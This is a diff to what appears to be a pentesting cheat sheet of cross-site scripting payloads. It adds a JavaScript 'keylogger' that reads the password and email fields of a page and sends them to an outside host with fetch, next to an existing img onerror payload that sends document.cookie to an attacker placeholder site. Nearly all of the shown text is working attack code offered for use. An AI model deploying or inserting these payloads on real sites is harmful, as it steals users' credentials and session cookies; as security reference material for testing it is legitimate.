@@ -763,6 +763,21 @@ Manually testing for XXE vulnerabilities generally involves
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
     ```
+- Keylogger [[Reference](https://hackerone.com/reports/2010530)]
+  ```
+  setTimeout(function () {
+    a = document.getElementsByName('password')[0];
+    b = document.getElementsByName('email')[0];
+    function f() {
+      fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
+    }
+    a.form.onclick=f;
+    a.onchange=f;
+    b.onchange=f;
+    a.oninput=f;
+    b.oninput=f;
+  }, 1000)
+  ```
 - Unusual events
   - `onpointerrawupdate` (Chrome only)
   - `onmouseleave`
